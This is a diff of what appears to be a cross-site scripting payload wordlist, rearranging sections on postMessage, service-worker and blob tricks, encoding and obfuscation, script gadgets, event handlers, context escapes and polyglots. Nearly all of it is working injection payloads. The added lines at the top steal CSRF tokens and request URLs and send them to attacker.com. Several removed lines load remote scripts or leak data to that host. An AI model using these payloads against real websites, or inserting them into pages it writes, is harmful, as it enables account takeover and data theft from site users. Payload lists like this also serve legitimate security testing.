+<script>XMLHttpRequest.prototype.open=function(m,u){if(u.indexOf('attacker')==-1){fetch('http://attacker.com/?u='+u)}}</script>
+<script>document.querySelector('input[name=csrf]').value&&fetch('//attacker.com/?t='+document.querySelector('input[name=csrf]').value)</script>
 
-# ── SCRIPT GADGETS (framework-specific) ──
-<div data-bind="attr:{src:'x'},event:{error:alert(1)}"><img>
-<x ng-bind-html="'<img src=x onerror=alert(1)>'"></x>
-<div :class="{a:alert(1)}"></div>
-<div v-once v-html="'<img src=x onerror=alert(1)>'"></div>
-<script id=x type=text>alert(1)</script><img onerror="eval(document.getElementById('x').text)" src=x>
+# ── POSTMESSAGE XSS ──
+<script>window.addEventListener('message',function(e){eval(e.data)})</script>
+<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>
+<iframe src="target.com" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')">
+<script>window.opener.postMessage({type:'xss',payload:'<script>alert(1)<\/script>'},'*')</script>
 
-# ── ADDITIONAL WAF BYPASS: OBFUSCATION ──
-<svg><script>alert&#x28;1&#x29;</script>
-<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
-<script>eval('alert(1)')</script>
+# ── SERVICE WORKER / BLOB XSS ──
+<script>navigator.serviceWorker.register('data:text/javascript,self.addEventListener("fetch",e=>e.respondWith(new Response("<script>alert(1)<\/script>",{headers:{"Content-Type":"text/html"}})))')</script>
+<script>var b=new Blob(['<script>alert(1)<\/script>'],{type:'text/html'});location=URL.createObjectURL(b)</script>
+<script>var u=URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'}));var s=document.createElement('script');s.src=u;document.body.appendChild(s)</script>
+
+# ── ENCODING TRICKS ──
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;script&#62;alert(1)&#60;/script&#62;
+\x3cscript\x3ealert(1)\x3c/script\x3e
+%253Cscript%253Ealert(1)%253C/script%253E
+%u003Cscript%u003Ealert(1)%u003C/script%u003E
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>({}[['constructor']]['constructor'])('alert(1)')()</script>
+<script>window['\x61\x6c\x65\x72\x74'](1)</script>
+
+# ── OBFUSCATION: ALTERNATIVE EXECUTION ──
 <script>(0,alert)(1)</script>
 <script>void(alert(1))</script>
 <script>throw alert(1)</script>
@@ -560,12 +406,54 @@ window.location='javascript:alert(1)'
 <script>queueMicrotask(alert.bind(null,1))</script>
 <script>Promise.resolve().then(()=>alert(1))</script>
 <script>Object.defineProperty(window,'x',{get:function(){alert(1)}});x</script>
-<script>Object.assign(window,{x:function(){alert(1)}});x()</script>
+<svg><script>alert&#x28;1&#x29;</script>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+
+# ── SCRIPT MODULE / TYPE TRICKS ──
+<script type=module>alert(1)</script>
+<script async>alert(1)</script>
+<script defer>alert(1)</script>
+<script>let a=`${alert(1)}`</script>
+<script>(`${alert(1)}`)</script>
+<svg onload="`${alert(1)}`">
+<img src=x onerror="`${alert(1)}`">
+<script>/*\nalert(1)\n*/</script>
+<svg><script>/**/alert/**/(/**/1/**/)/**/</script></svg>
+
+# ── BROWSER-SPECIFIC / META ──
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+<link rel="stylesheet" href="javascript:alert(1)">
+<script type="text/javascript" src="data:,alert(1)"></script>
+
+# ── SPECIAL ATTRIBUTE CONTEXTS ──
+<svg><a><rect width=100 height=100/><set attributeName=href to=javascript:alert(1)></a></svg>
+<math href=javascript:alert(1)>CLICKME</math>
+<a href="javas&#99;ript:alert(1)">x</a>
+<a href="jAvAsCrIpT:alert(1)">x</a>
+<a href=javascript&colon;alert(1)>x</a>
+<object type=text/html data="javascript:alert(1)">
+<embed type="text/html" src="javascript:alert(1)">
+<form action=javascript:alert(1)><input type=submit>
+<button formaction=javascript:alert(1)>click</button>
+<input formaction=javascript:alert(1) type=submit value=click>
+
+# ── SCRIPT GADGETS ──
+<div data-bind="attr:{src:'x'},event:{error:alert(1)}"><img>
+<x ng-bind-html="'<img src=x onerror=alert(1)>'"></x>
+<div :class="{a:alert(1)}"></div>
+<div v-once v-html="'<img src=x onerror=alert(1)>'"></div>
+<script id=x type=text>alert(1)</script><img onerror="eval(document.getElementById('x').text)" src=x>
 
 # ── ADDITIONAL EVENT HANDLERS ──
 <div ongotpointercapture=alert(1)>x</div>
 <div onlostpointercapture=alert(1)>x</div>
 <body onpopstate=alert(1)><a href=#x>click</a>
+<body onhashchange=alert(1)><a href=#x>click</a>
+<body onresize=alert(1)>
+<body onscroll=alert(1)>
+<body onunload=alert(1)>
+<body onbeforeunload=alert(1)>
 <div contenteditable oninput=alert(1)>type here</div>
 <div contenteditable onbeforeinput=alert(1)>type</div>
 <input type=file onchange=alert(1)>
@@ -574,55 +462,36 @@ window.location='javascript:alert(1)'
 <form onreset=alert(1)><input type=reset></form>
 <iframe onmouseenter=alert(1)>
 <div ondblclick=alert(1)>dblclick</div>
-<html onmousewheel=alert(1)>
+<video oncanplay=alert(1) src=data:video/mp4,>
+<audio oncanplay=alert(1) src=data:audio/mp3,>
+<div onauxclick=alert(1)>middle-click</div>
+<div oncontextmenu=alert(1)>right-click</div>
+<div onwheel=alert(1)>scroll wheel</div>
+<div ontouchstart=alert(1)>touch</div>
+<input oncopy=alert(1) value="copy me">
+<input onpaste=alert(1)>
+<div onfocus=alert(1) tabindex=0>focus</div>
+<div onblur=alert(1) tabindex=0>blur</div>
 
 # ── ADDITIONAL CONTEXT ESCAPE ──
 </script>/*--></script><script>alert(1)</script>
 ';/*</script><script>alert(1)//
 \x3c\x73\x63\x72\x69\x70\x74\x3ealert(1)\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3cimg\x20src\x3dx\x20onerror\x3dalert(1)\x3e
 "><a href=javascript:alert(1)>xss</a>
-'><a href=javascript:alert(1)>xss</a>
 "><link rel=stylesheet href=javascript:alert(1)>
 "><meta http-equiv=refresh content=0;url=javascript:alert(1)>
 "><button formaction=javascript:alert(1)>XSS</button>
-
-# ── ADDITIONAL CSP BYPASS TECHNIQUES ──
-<base href=//attacker.com>
-<link rel=prefetch href=//attacker.com/leak?c=>
-<link rel=preload href=//attacker.com as=script>
-<link rel=dns-prefetch href=//attacker.com>
-<script src=data:,alert(1)></script>
-<script>import('data:text/javascript,alert(1)')</script>
-<iframe srcdoc="<script src=//attacker.com/xss.js></script>">
-<meta http-equiv=Content-Security-Policy content="default-src *">
-
-# ── ADDITIONAL ENCODING ──
-%253Cscript%253Ealert(1)%253C/script%253E
-%u003Cscript%u003Ealert(1)%u003C/script%u003E
-<svg><script>/**/alert/**/(/**/1/**/)/**/</script></svg>
-<script>/*\nalert(1)\n*/</script>
-<script>//\nalert(1)</script>
-<script type=module>alert(1)</script>
-<script async>alert(1)</script>
-<script defer>alert(1)</script>
-
-# ── TEMPLATE LITERAL / ES6 TRICKS ──
-<script>let a=`${alert(1)}`</script>
-<script>(`${alert(1)}`)</script>
-<svg onload="`${alert(1)}`">
-<img src=x onerror="`${alert(1)}`">
 
 # ── ADDITIONAL POLYGLOT ──
 '"><img/src/onerror=location=`javas\x63ript\x3aalert\x281\x29`>
 '"><svg/onload=location=`javas\x63ript\x3aalert\x281\x29`>
 <iframe src="javascript:void('<script>alert(1)</script>')">
-<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
 <form method=GET action=javascript:alert(1)><input type=submit value=go>
-<isindex action="javascript:alert(1)" type=image>
-<button type=submit formaction=javascript:alert(1) form=x><form id=x>
-<object type="text/x-scriptlet" data="http://attacker.com/xss.sct">
 <plaintext></plaintext><img src=x onerror=alert(1)>
 <!--[if IE]><img src=x onerror=alert(1)><![endif]-->
-<![if IE]><img src=x onerror=alert(1)><![endif]>
 <%2Fscript><script>alert(1)<%2Fscript>
+
+# ── CONTEXT: JSON RESPONSE ──
+\";<script>alert(1)</script>
+\");alert(1);//
+"}alert(1)//
